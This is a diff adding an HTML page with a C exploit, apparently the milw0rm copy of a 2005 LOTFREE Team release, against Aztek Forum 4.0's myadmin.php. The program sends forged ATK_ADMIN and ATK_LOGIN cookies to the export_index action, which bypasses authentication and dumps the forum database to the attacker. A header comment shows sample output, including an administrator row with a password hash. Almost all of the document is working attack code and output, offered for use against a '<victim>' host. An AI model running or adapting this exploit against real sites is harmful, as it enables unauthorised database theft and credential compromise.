@@ -1,0 +1,106 @@
+<html><head><title>Aztek Forum <= 4.0 [myadmin.php] Database Dumper Exploit</title></head><pre>/* Changed line 81 - Tested and working /str0ke */
+
+/*
+ *   LOTFREE Team presents :
+ * Forum-Aztek v4.0 (4nd pr0b4bly inf3ri0r) Database Dump Xpl0it
+ * 0day dUd3 X-)
+ *
+ * ./aztek-sploit 127.0.0.1 admin forum
+ * HTTP/1.1 200 OK
+ * Date: Sat, 05 Mar 2005 22:18:13 GMT
+ * Server: Apache/2.0.50 (Ubuntu) PHP/4.3.8
+ * X-Powered-By: PHP/4.3.8
+ * Set-Cookie: ATK_ADMIN=
+ * Expires: Sat, 05 Mar 2005 22:18:13 GMT
+ * Content-Disposition: attachment; filename=&quot;backup-admin-2005-5-03-23-18-13.sql&quot;
+ * Connection: close
+ * Transfer-Encoding: chunked
+ * Content-Type: application/force-download
+ *
+ * (...)
+ * INSERT INTO atk_users VALUES ('admin','admin','atm5zzHCTXNkc',0,'',0,0,0,'','',0,0,'','',1109861125,63,'0','','','','','',0,0,'');
+ *                            password in DES ---+^^^^^^^^^^^^^
+ * (...)
+ * sw333333t !
+ * http://lotfree.next-touch.com
+ */
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;string.h&gt;
+
+#define REQ1 &quot;/myadmin.php?action=export_index&amp;login=&quot;
+#define REQ2 &quot; HTTP/1.1\nHost: &quot;
+#define REQ3 &quot;\nCookie: ATK_ADMIN=blah; ATK_LOGIN=&quot;
+#define REQ4 &quot;\nConnection: close\n\n&quot;
+
+unsigned long resolve (char *host) 
+{
+  struct in_addr in; 
+  struct hostent *he; 
+	    
+  if((in.s_addr=inet_addr(host))==-1) 
+  { 
+    if((he=(struct hostent*)gethostbyname(host))==NULL) 
+    { 
+      herror(&quot;Resolving victim host&quot;); 
+      exit(1); 
+    } 
+    memcpy((caddr_t)&amp;in, he-&gt;h_addr, he-&gt;h_length); 
+  }
+  return(in.s_addr); 
+}
+
+int main(int argc,char *argv[])
+{
+  int sock;
+  struct sockaddr_in sin;
+  char c;
+
+  if(argc!=4)
+  {
+    printf(&quot;[*]--------------------------------[*]\n&quot;);
+    printf(&quot; | Aztek-Forum Database Dump Xploit |\n&quot;);
+    printf(&quot; |   sirius_black // LOTFREE Team   |\n&quot;);
+    printf(&quot;[*]--------------------------------[*]\n\n&quot;);
+    printf(&quot;Usage: %s &lt;victim&gt; &lt;admin_login&gt; &lt;forum_directory&gt;\n\n&quot;,argv[0]);
+    printf(&quot;Exemple: %s www.tictactoe.com admin forum &gt; database.sql\n\n&quot;,argv[0]);
+    exit(1);
+  }
+  if((sock=socket(PF_INET,SOCK_STREAM,0))==-1)
+  {
+    perror(&quot;socket&quot;);
+    exit(1);
+  }
+  sin.sin_family=AF_INET;
+  sin.sin_port=htons(80);
+  sin.sin_addr.s_addr=resolve(argv[1]);//  sin.sin_addr.s_addr=resolve(&quot;127.0.0.1&quot;);
+  if(connect(sock,(struct sockaddr*)&amp;sin,sizeof(struct sockaddr))==-1)
+  {
+    perror(&quot;connect&quot;);
+    exit(1);
+  }
+  send(sock,&quot;GET /&quot;,5,0);
+  send(sock,argv[3],strlen(argv[3]),0);
+  send(sock,REQ1,sizeof(REQ1)-1,0);
+  send(sock,argv[2],strlen(argv[2]),0);
+  send(sock,REQ2,sizeof(REQ2)-1,0);
+  send(sock,argv[1],strlen(argv[1]),0);
+  send(sock,REQ3,sizeof(REQ3)-1,0);
+  send(sock,argv[2],strlen(argv[2]),0);
+  send(sock,REQ4,sizeof(REQ4)-1,0);
+  while((recv(sock,&amp;c,1,0))==1)
+  {
+    putchar(c);
+  }
+  close(sock);
+  return 0;
+}
+
+// milw0rm.com [2005-03-07]</pre></html>
